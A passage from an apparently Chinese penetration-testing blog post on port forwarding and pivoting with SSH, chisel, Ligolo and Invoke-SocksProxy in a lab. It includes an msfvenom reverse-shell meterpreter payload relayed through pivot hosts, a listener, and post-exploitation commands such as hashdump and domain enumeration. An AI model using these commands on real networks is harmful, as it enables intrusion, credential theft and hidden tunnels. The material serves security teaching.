class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh\&quot;&gt;ssh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;SSH基本参数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-C 压缩传输，加快传输速度&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f 在后台对用户名密码进行认证&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-q 安静模式，不要显示任何debug信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-l 指定ssh登录名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g 允许远程主机连接到本地用于转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-L 进行本地端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-R 进行远程端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D 动态转发，即socks代理&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-T 禁止分配伪终端&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-p 指定远程ssh服务端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;本地攻击机执行，把115的3389映射到本地的33890上&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&quot;2\&quot;&gt;\n&lt;li&gt;方法2（上线MSF）\n** 攻击机—出网Linux靶机—不出网Linux靶机—不出网win机 **\n攻击逻辑说明：&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n&lt;li&gt;Windows 执行 1.exe&lt;/li&gt;\n&lt;li&gt;→ 连接 “不出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;不出网 Linux 把 12138 映射到 “出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓&lt;/li&gt;\n&lt;li&gt;攻击机 msfconsole 收到 meterpreter 会话&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;攻击机监听端口12345&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lport 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set ExitOnSession false&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; exploit -j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Exploit running as background job 0.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Started reverse TCP handler on 0.0.0.0:12345&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;不出网Linux机&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样就建立连接了，然后可以这样做&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 把会话放到后台&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; background&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看/升级 transport（断网重连）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; sessions -i 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport next&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 常用其它命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; sysinfo # 系统版本 / 补丁\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; getuid # 当前用户 / 特权\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_domain #域信息\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;外网攻击107，内网靶机97&lt;/p&gt;\n&lt;p&gt;出网靶机编辑后restart ssh服务&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\nservice rinetd start&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;invoke-socksproxy\&quot;&gt;Invoke-SocksProxy&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#invoke-socksproxy\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gitee.com/RichChigga/Invoke-SocksProxy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Import-Module .\\Invoke-SocksProxy.psm1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ligolo\&quot;&gt;Ligolo&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ligolo\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd `go env GOPATH`/src&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;git clone https://github.com/sysdream/ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;cd ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make dep&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;生成证书,example.com换成攻击机的域名或IP地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make certs TLS_HOST=example.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make build-all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;./bin/localrelay_linux_amd64&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -CfNg -D 11601 root@靶机IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机&lt;/p&gt;\n&lt;h1 id=\&quot;chisel\&quot;&gt;chisel&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#chisel\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;工具下载链接：\n&lt;a href=\&quot;https://github.com/jpillora/chisel\&quot;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;攻击机执行&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chisel server -p 12138 –reverse&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n靶机执行&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;iptables&quot;],&quot;text&quot;:[0,&quot;iptables&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;lcx&quot;],&quot;text&quot;:[0,&quot;lcx&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;msf&quot;],&quot;text&quot;:[0,&quot;msf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;netsh&quot;],&quot;text&quot;:[0,&quot;netsh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssf&quot;],&quot;text&quot;:[0,&quot;ssf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh&quot;],&quot;text&quot;:[0,&quot;ssh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;invoke-socksproxy&quot;],&quot;text&quot;:[0,&quot;Invoke-SocksProxy&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ligolo&quot;],&quot;text&quot;:[0,&quot;Ligolo&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;chisel&quot;],&quot;text&quot;:[0,&quot;chisel&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/28&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/avatar.webp" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/avatar.webp" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands 